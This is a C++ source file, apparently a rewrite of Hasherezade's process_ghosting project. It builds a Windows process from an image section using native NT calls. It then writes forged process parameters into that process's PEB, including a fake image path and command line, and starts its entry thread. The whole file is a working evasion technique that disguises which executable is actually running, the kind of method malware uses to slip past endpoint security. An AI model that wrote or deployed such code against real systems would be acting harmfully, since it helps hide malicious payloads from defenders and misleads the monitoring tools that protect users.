// basically rewrite from process_ghosting by Hasherezade
// thanks to the amazing project: github.com/hasherezade/process_ghosting
#include "ntlib/util.h"
#include "misc.h"
#include <iostream>

PPEB fetchPEB(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pi = { 0 };
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(pi), 0)) return 0;
    PPEB peb_copy = new PEB();
    if (NtReadVirtualMemory(hProcess, pi.PebBaseAddress, peb_copy, sizeof(PEB), NULL)) return 0;
    return peb_copy;
}

DWORD get_entry_point_rva(const BYTE* pe_buffer) {
    auto ntHdr = (PIMAGE_NT_HEADERS)&pe_buffer[((PIMAGE_DOS_HEADER)pe_buffer)->e_lfanew];
    if (ntHdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) return PIMAGE_NT_HEADERS64(ntHdr)->OptionalHeader.AddressOfEntryPoint;
    else return PIMAGE_NT_HEADERS32(ntHdr)->OptionalHeader.AddressOfEntryPoint;
}

//Preserve the aligmnent! The remote address of the parameters must be the same as local.
LPVOID write_params_into_process(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, DWORD protect)
{
    if (params == NULL) return NULL;

    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    //params and environment in one space:
    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end) {
            buffer_end = env_end;
        }
    }
    // copy the continuous area containing parameters + environment
    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
            std::cerr << "Writing RemoteProcessParams failed" << std::endl;
            return nullptr;
        }
        if (params->Environment) {
            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
                std::cerr << "Writing environment failed" << std::endl;
                return nullptr;
            }
        }
        return (LPVOID)params;
    }

    // could not copy the continuous space, try to fill it as separate chunks:
    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        std::cerr << "Allocating RemoteProcessParams failed" << std::endl;
        return nullptr;
    }
    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
        std::cerr << "Writing RemoteProcessParams failed" << std::endl;
        return nullptr;
    }
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            std::cerr << "Allocating environment failed" << std::endl;
            return nullptr;
        }
        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
            std::cerr << "Writing environment failed" << std::endl;
            return nullptr;
        }
    }
    return (LPVOID)params;
}

bool updatePtr_ProcessParam(PVOID params_base, HANDLE hProcess)
{
    // Get access to the remote PEB:
    PROCESS_BASIC_INFORMATION pi = { 0 };
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), 0))
        return false;
    
    // Calculate offset of the parameters
    LPVOID remote_img_base = (LPVOID)((size_t)pi.PebBaseAddress + offsetof(PEB, ProcessParameters));

    //Write parameters address into PEB:
    if (!WriteProcessMemory(hProcess, remote_img_base, &params_base, sizeof(PVOID), 0)) {
        std::cout << "Cannot update Params!" << std::endl;
        return false;
    }
    return true;
}

bool setup_process_parameters(HANDLE hProcess, LPCWSTR targetPath)
{
    *(size_t*)&RtlCreateProcessParametersEx = (size_t)GetProcAddress(LoadLibraryA("ntdll"), "RtlCreateProcessParametersEx");

    
    PUNICODE_STRING(*unstr)(LPCWSTR) = [](LPCWSTR szUsed) {
        PUNICODE_STRING ptr = new UNICODE_STRING();
        RtlInitUnicodeString(ptr, szUsed);
        return ptr;
    };

    wchar_t dirPath[MAX_PATH] = { 0 };
    GetCurrentDirectoryW(MAX_PATH, dirPath);


    LPVOID environment;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    PRTL_USER_PROCESS_PARAMETERS params = nullptr;
    NTSTATUS status = RtlCreateProcessParametersEx(
        /* pProcessParameters */ &params,
        /* ImagePathName      */ unstr(targetPath),
        /* DllPath            */ unstr(L"C:\\Windows\\System32"),
        /* CurrentDirectory   */ unstr(dirPath),
        /* CommandLine        */ unstr(targetPath),
        /* Environment        */ environment,
        0, 0, 0, 0, RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
        return false;
    }
    LPVOID remote_params = write_params_into_process(hProcess, params, PAGE_READWRITE);
    if (!remote_params) {
        std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
        return false;
    }

    if (!updatePtr_ProcessParam(remote_params, hProcess)) {
        std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

int spawnProcess(LPCWSTR exeToRun, LPCWSTR fakePath)
{
    HANDLE hSection(0), hProcess(0), fptrPeModule(0); 

    // step 1: open static file from NTFS. and create it as an image_section
    fptrPeModule = CreateFile(exeToRun, SYNCHRONIZE | GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (size_t(fptrPeModule) < 1) return -1;
    if (NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, fptrPeModule)) return -2;
    std::wcout << L"[v] create section from " << exeToRun << std::endl;

    // step 2: locate the entry pointer of the PE file
    BYTE dummy[4096];
    ReadFile(fptrPeModule, dummy, sizeof(dummy), 0, 0);
    DWORD payload_ep = get_entry_point_rva(dummy);
    std::wcout << L"[v] locate entry @ " << std::hex << payload_ep << std::endl;
    NtClose(fptrPeModule);

    // step 3: create a new process by the image_section
    //    3.1: locate addr of PEB, and we can check the VAD of main func now
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, 0, /* Parent */ NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, 0, 0, 0);
    ULONGLONG procEntry = (size_t)fetchPEB(hProcess)->ImageBaseAddress + payload_ep;
    std::wcout << L"[v] process (" << hProcess << ") spawned from section!" << std::endl;

    // step 4: set up process arguments (of PEB) for the child process
    if (!setup_process_parameters(hProcess, fakePath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    } else
        std::wcout << L"[v] setup parameters for PEB ok." << std::endl;
    
    // step 5: finally, create a thread for it. finish :)
    HANDLE hThread = NULL;
    *(size_t*)&NtCreateThreadEx = (size_t)GetProcAddress(LoadLibraryA("ntdll"), "NtCreateThreadEx");
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE)procEntry, 0,0,0,0,0,0 );
    std::wcout << L"[v] enjoy :)" << std::endl;
    return 0;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3)
        std::wcout << argv[0] << " [exe/to/run] [fake/file/path]" << std::endl;
    else
        return spawnProcess(argv[1], argv[2]);
}
